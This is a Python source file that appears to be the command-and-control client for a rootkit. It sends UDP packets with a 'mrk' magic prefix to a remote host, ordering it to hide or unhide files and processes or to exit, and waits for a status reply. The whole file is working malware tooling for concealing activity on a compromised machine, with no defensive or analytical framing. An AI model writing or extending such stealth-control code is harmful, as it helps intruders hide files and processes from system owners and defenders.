import random
import struct
from dataclasses import dataclass
from datetime import datetime, timedelta
from enum import Enum
from socket import socket, IPPROTO_UDP, SOCK_DGRAM, AF_INET, SocketType, SO_REUSEPORT, SOL_SOCKET, timeout as TimeoutError

from typing import List

JOB_ID_SIZE = 2 * 8
REQUEST_PORT = 1111
RESPONSE_PORT = 2312


class CommandType(Enum):
    HIDE_FILE = 'hfile'
    UNHIDE_FILE = 'ufile'
    HIDE_PROCESS = 'hproc'
    UNHIDE_PROCESS = 'uproc'
    EXIT = 'fexit'


@dataclass
class Job:
    _id: int
    _type: str
    _arg: str


class Server:
    def __init__(self, timeout=2):
        self._sock: SocketType = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        self._sock.setsockopt(SOL_SOCKET, SO_REUSEPORT, 1)
        self._sock.settimeout(0.1)
        self._sock.bind(('0.0.0.0', RESPONSE_PORT))
        self._commands: List[Job] = []
        self._timeout = timeout

    def execute_on_remote(self, remote_ip: str, command: CommandType, argument: str = ''):
        job_id = random.randint(0, 2 ** JOB_ID_SIZE - 1)
        self._sock.sendto(b'mrk' + job_id.to_bytes(JOB_ID_SIZE // 8, 'little') + f'{command.value}{argument}'.encode('ascii'), (remote_ip, REQUEST_PORT))
        start_time = datetime.now()
        while datetime.now() - start_time < timedelta(seconds=self._timeout):
            try:
                response = self._sock.recv(3 * 8)
                print(response)
            except TimeoutError:
                continue
            response_id, response_status = struct.unpack('hc', response)
            if response_id != job_id:
                continue
            return response_status
        raise RuntimeError('No response')

    def close(self):
        self._sock.close()


if __name__ == '__main__':
    s = Server()
    s.execute_on_remote('127.0.0.1', CommandType.HIDE_FILE, '/home/yanayg/test_file2')
